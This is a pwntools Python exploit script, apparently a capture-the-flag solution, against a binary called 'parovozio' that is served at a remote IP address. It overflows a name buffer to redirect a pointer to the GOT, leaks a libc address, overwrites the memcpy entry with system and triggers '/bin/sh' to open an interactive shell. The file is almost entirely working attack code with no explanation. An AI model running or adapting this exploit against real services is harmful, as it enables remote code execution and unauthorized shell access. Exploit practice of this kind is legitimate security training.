#!/usr/bin/env python3
from pwn import *
context.update(encoding="latin1",bits=64,arch="amd64",os="linux",terminal=["tmux","splitw","-h"])
tube.sla=tube.sendlineafter;tube.sa=tube.sendafter;tube.sl=tube.sendline;tube.ru=tube.recvuntil;tube.rl=tube.recvline;tube.rls=tube.recvlines;tube.rgx=tube.recvregex;tube.inter=tube.interactive;ELF.address=ELF.addr=ELF.address
EP = "./parovozio"
elf = ELF(EP)
libc = ELF("./libc.so.6")# 2.40
_='''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''
__ = b": "

def add(name, weight=0):
    io.sla(__, b"1")
    io.sla(__, name)
    io.sla(__, str(weight))

def dell(idx):
    io.sla(__, b"2")
    io.sla(__, str(idx))

def swap(idx_A, idx_B):
    io.sla(__, b"4")
    io.sla(__, str(idx_A))
    io.sla(__, str(idx_B))

def disp(idx):
    io.sla(__, b"4")
    io.sla(__, str(idx))
    io.ru(b"name: ")

def edit(idx, name, weight=0):
    io.sla(__, b"5")
    io.sla(__, str(idx))
    io.sla(__, name)
    io.sla(__, str(weight))

dbg='''
# b *0x00000000004020b0
# b *0x00000000004020f0
# b *$base("libc")+0xf6292
c
'''
io = (args.GDB and gdb.debug([EP],dbg) or args.LOCAL and process([EP]) or remote("89.232.167.226",11111))

add(b'a'*7)
add(b'b'*7)

edit(0, b'c'*0x18 + p64(elf.got.__libc_start_main))
disp(1)
libc.address = u64(io.rl(0)+b'\0') - 0x2a3f0
log.critical(f"{libc.address = :#x}")

edit(0, b"/bin/sh\0" + b'd'*0x10 + p64(elf.got.memcpy))
edit(1, p64(libc.sym.system)[:-1])

edit(0, b"/bin/sh")

io.inter()
